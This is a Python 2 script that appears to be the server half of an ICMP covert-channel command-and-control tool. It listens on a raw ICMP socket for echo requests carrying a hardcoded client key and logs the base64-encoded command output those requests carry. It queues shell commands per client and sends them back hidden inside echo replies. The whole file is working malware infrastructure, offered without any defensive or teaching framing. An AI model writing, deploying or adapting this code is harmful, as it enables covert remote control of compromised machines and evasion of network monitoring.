#!/usr/bin/python2

from scapy.all import *
from random import randrange
from base64 import b64decode, b64encode

import socket

def process_c2_call(payload, client_id):
    output_to_file = b64decode(payload)
    with open('c2_output.{}'.format(client_id), 'a+') as output_file:
        output_file.write(output_to_file+'\n')

def is_c2_appropriate():
    if randrange(6) == 1:
        return True
    else:
        return False

def generate_command(client_id):
    with open('command_list.{}'.format(client_id), 'a+') as file_read:
        read_data = file_read.readlines()
        try:
            next_command = read_data.pop(0)
        except:
            next_command = ""
    with open('command_list.{}'.format(client_id), 'w+') as file_write:
        for i in read_data:
            file_write.write("{}".format(i))
    return next_command

def generate_reply_packet(packet_dst, packet_icmp_id, packet_icmp_seq, packet_payload):
    print('generating packet!')
    command_packet = IP(dst=packet_dst)/ICMP(type=0, id=packet_icmp_id, seq=packet_icmp_seq)/packet_payload
    return command_packet

def main():
    client_key = "0xdeadbeef"
    server_key = "0xdeaddead"
    c2_interface = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    c2_interface.bind(('', 0))
    while True:
        c2_command_payload = server_key
        raw_packet = c2_interface.recv(65535)
        print('packet received')
        scapy_packet = IP(raw_packet)
        echo_request_payload = scapy_packet[ICMP][Raw].load
        print(echo_request_payload)
        if echo_request_payload[:10] == client_key:
            print('packet from client')
            echo_request_id = scapy_packet[ICMP].id
            echo_request_seq = scapy_packet[ICMP].seq
            ip_src = scapy_packet.src
            if len(echo_request_payload) > 10:
                print('command return detected')
                process_c2_call(echo_request_payload[10:], echo_request_id)
            if is_c2_appropriate():
                print('totally appropriate')
                c2_command_payload += b64encode(generate_command(echo_request_id))
            send(generate_reply_packet(scapy_packet.src, scapy_packet[ICMP].id, scapy_packet[ICMP].seq, c2_command_payload))
            print('packet sent!')

if __name__ == "__main__":
    main()

